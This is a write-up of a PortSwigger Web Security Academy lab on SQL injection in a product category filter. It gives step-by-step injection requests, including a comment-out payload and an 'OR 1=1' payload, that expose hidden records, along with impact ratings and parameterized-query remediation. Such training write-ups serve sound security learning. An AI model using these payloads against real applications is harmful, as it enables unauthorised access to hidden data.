# Lab 01 — SQL Injection: Retrieving Hidden Data

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Apprentice  
**Lab URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

---

## Overview

| Field | Detail |
|---|---|
| **Vulnerability** | SQL Injection — WHERE clause manipulation |
| **CWE** | CWE-89: Improper Neutralization of Special Elements in an SQL Command |
| **CVSS v3.1 Score** | 7.5 — High |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **ISO 27001 Control** | A.8.28 — Secure Coding |
| **OWASP Top 10** | A03:2021 — Injection |

---

## Vulnerability Description

The application passes user-supplied input directly into a SQL query without sanitization. The product category filter parameter is embedded in a `WHERE` clause, allowing an attacker to manipulate the query logic and retrieve data that would otherwise be hidden — in this case, unreleased or inactive products.

**Vulnerable query (approximate):**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

By injecting into the `category` parameter, an attacker can bypass the `released = 1` restriction and retrieve all records.

---

## Steps to Reproduce

1. Navigate to the shop and observe the category filter in the URL:
   ```
   GET /filter?category=Gifts
   ```

2. Inject a single quote to test for errors:
   ```
   GET /filter?category=Gifts'
   ```
   → Server returns a SQL error — injection confirmed.

3. Comment out the `AND released = 1` condition:
   ```
   GET /filter?category=Gifts'--
   ```
   → Unreleased products appear in the response.

4. Retrieve all products across all categories:
   ```
   GET /filter?category='+OR+1=1--
   ```
   → All records returned, including hidden ones.

See [`payloads/payloads.sql`](./payloads/payloads.sql) for all tested payloads.

---

## Impact

An unauthenticated attacker can retrieve data the application intentionally hides. In production this could expose unreleased products, draft records, or data scoped to other users.

| CIA | Impact | Reason |
|-----|--------|--------|
| Confidentiality | **High** | Hidden records fully exposed |
| Integrity | None | Read-only exploitation |
| Availability | None | No disruption caused |

---

## Root Cause

The application builds SQL queries via string concatenation with unsanitized user input. No parameterized queries are used.

See [`remediation/vulnerable.py`](./remediation/vulnerable.py) for the vulnerable pattern.

---

## Remediation

Use parameterized queries / prepared statements — see examples:

- [`remediation/fix.py`](./remediation/fix.py) — Python (psycopg2)
- [`remediation/fix.java`](./remediation/fix.java) — Java (JDBC)

### Additional Hardening

- Validate and whitelist input — reject unexpected characters in filter parameters
- Apply least privilege — database user should have `SELECT` only
- Enable WAF rules for SQL injection signatures
- Run regular DAST scans with Burp Suite or OWASP ZAP

---

## References

- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
- [NIST CVSS Calculator](https://nvd.nist.gov/vuln-metrics/cvss)
- [ISO/IEC 27001:2022 Annex A.8.28](https://www.iso.org/standard/27001)

---

*Writeup produced for educational purposes as part of PortSwigger Web Security Academy lab practice.*
